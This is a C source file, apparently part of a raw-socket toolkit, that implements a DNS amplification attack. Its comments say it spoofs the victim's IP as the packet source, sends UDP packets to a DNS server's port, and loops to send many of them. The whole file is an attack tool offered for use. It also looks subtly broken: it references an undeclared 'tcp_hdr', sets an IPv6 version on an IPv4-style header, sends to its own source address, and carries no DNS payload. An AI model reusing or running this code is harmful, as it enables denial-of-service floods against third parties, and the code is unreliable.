#include "ip-headers.h"
#include "ip-constructors.c"
#include "applications.c"
#include "constants.h"
#include <stdio.h>
// Arguments standarized and checked //

// Respects executable [--source-addr saddr --[remote|broadcast]-addr raddr --source-port sport [--remote-port rport] [--n N]] //

/** Spoofs victim ip in source address, dns address in remote address, remote port is dns port, and source port can be random **/
int main(int argc,char* argv[]){
	srand(time(NULL));
    if(argc!=11){ fprintf(stdout,"Usage: dns-amplification-udp --source-addr saddr --remote-addr raddr --source-port sport -remote-port rport --n N\n"); exit(0); }
	else{	
		
		/** Example source address and source port **/
		char* source_address = argv[2];
		char* source_port    = argv[6];
		char* remote_address = argv[4];
		char* remote_port    = argv[8];
		unsigned int iter    = atoi(argv[10]);
		/** Obtain the socket**/
		int sock = get_socket_descriptor_raw_udp();
		/** Create buffer for your packets **/
		char buffer[DEFAULT_PCKT_LEN]; memset(buffer,0,DEFAULT_PCKT_LEN);
		
		/** Init sockaddr_in with my network information **/
		struct sockaddr_in myaddr;
		set_sockaddr_in(&myaddr,source_address,source_port);

		/** Create your headers and make your combinations **/
		IP_HEADER *ip_hdr   = (IP_HEADER *)buffer;
		UDP_HEADER *udp_hdr = (UDP_HEADER *)(buffer + sizeof(IP_HEADER));

		/** Fill your headers (IP && UDP in this case) **/
		set_ip_header(ip_hdr,IP_VERSION_V6,IP_DEFAULT_IHL,IP_CURRENT_TOS,IP_DEFAULT_IDENTIFICATION,0,0,0,\
			      IP_DEFAULT_FRAGMENT_OFFSET,IP_DEFAULT_TTL,IP_UDP_PROTOCOL,0,source_address,remote_address,0);

		/** Use auxiliar functions to warn of current status **/
		SHOW_CREATED_IP_HEADER(ip_hdr);
		
		set_udp_header(udp_hdr,source_port,remote_port,46,0);
		SHOW_CREATED_UDP_HEADER(tcp_hdr);

		/** Notice the kernel that we doesn't need it fill the header **/
		if(kernel_not_fill_my_header(sock)<0){fprintf(stderr,"Is not possible to notice the kernel"); exit(0);}
		
		/** Application **/
		int i,sent=0;
		for(i=0;i<iter;i++){
			if(sendto(sock, buffer, ip_hdr->total_length, 0, (struct sockaddr *)&myaddr, sizeof(myaddr))>=0) sent++;
		}
		fprintf(stdout,"Sent %d dns spoofed requests\n",sent);
	
	}
	return 0;
}
